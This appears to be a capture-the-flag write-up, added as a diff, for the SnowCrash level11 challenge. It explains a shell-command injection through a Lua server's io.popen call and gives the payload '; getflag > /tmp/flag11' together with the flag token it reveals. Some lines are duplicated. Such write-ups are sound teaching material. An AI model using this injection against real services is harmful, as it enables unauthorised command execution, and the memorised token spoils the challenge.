@@ -1,0 +1,89 @@
+When we login as Level11 we get the following file in our home directory
+
+level11@SnowCrash:~$ ls -l
+total 4
+-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
+
+level11.lua is a Lua script that contain the following code :
+
+--------------------------------------------------------------
+#!/usr/bin/env lua
+local socket = require("socket")
+local server = assert(socket.bind("127.0.0.1", 5151))
+
+function hash(pass)
+  prog = io.popen("echo "..pass.." | sha1sum", "r")
+  data = prog:read("*all")
+  prog:close()
+
+  data = string.sub(data, 1, 40)
+
+  return data
+end
+
+
+while 1 do
+  local client = server:accept()
+  client:send("Password: ")
+  client:settimeout(60)
+  local l, err = client:receive()
+  if not err then
+      print("trying " .. l)
+      local h = hash(l)
+
+      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
+          client:send("Erf nope..\n");
+      else
+          client:send("Gz you dumb*\n")
+      end
+
+  end
+
+  client:close()
+end
+--------------------------------------------------------------
+
+
+The code is simple. It contains 1 function that that accept one argument called pass
+
+The function hash calls a function called io.popen, from the Official Documentatio (https://www.lua.org/manual/5.3/manual.html#pdf-io.popen) of Lua and this Stack Overflow post (https://stackoverflow.com/questions/5239317/io-popen-how-to-wait-for-process-to-finish-in-lua/5243210#5243210) we understand that the function popen executes the argument passed to it in the shell. and then the result is read and return to the caller.
+
+We also have an infinite loop that accepts ant incoming socket connections and ask for password :
+
+IF a password is passed then it calls the hash function with the user provided password as it's argument and compares (~=) the 2 hashes and if the password is not correct it prints Erf nope.. else it prints Erf nope.. and then closes the connection.
+
+from the information in the beginning of program :
+
+--------------------------------------------------------------
+local server = assert(socket.bind("127.0.0.1", 5151))
+--------------------------------------------------------------
+
+we know the server is running on the localhost on port 5151 So to test it we can simply use the program netcat (alias : nc) as follows :
+
+level11@SnowCrash:~$ nc localhost 5151
+Password: 
+
+By reading the code we know that we can exploit the command that executes our given data in the shell :
+
+-------------------------------------------------------------------
+prog = io.popen("echo "..pass.." | sha1sum", "r")
+-------------------------------------------------------------------
+
+So whatever we pass in as password will be passed to the string "echo "..pass.." | sha1sum". One IMPORTANT thing to keep in mind is that any data produced in the standard outputs will be piped to the next command which is sha1sum
+
+
+And with everything mentioned before keeping in mind what we must do is to save the data that is sent to the standard output in a file so it is not piped. So we can use the following command to get the hash: 
+
+level11@SnowCrash:~$ echo '; getflag > /tmp/flag11' | nc localhost 5151; cat /tmp/flag11
+Password: Erf nope..
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
+What we are doing in our command is simply telling to finish the command by ; and giving a new command that is to call the program getflag and saving it's content in a file /tmp/flag11.
+
+level11@SnowCrash:~$ echo '; getflag > /tmp/flag11' | nc localhost 5151; cat /tmp/flag11
+Password: Erf nope..
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
+
+What we are doing in our command is simply telling to finish the command by ; and giving a new command that is to call the program getflag and saving it's content in a file /tmp/flag11.
+
+So the Password to connect to the account level12 is fa6v5ateaw21peobuub8ipe6s
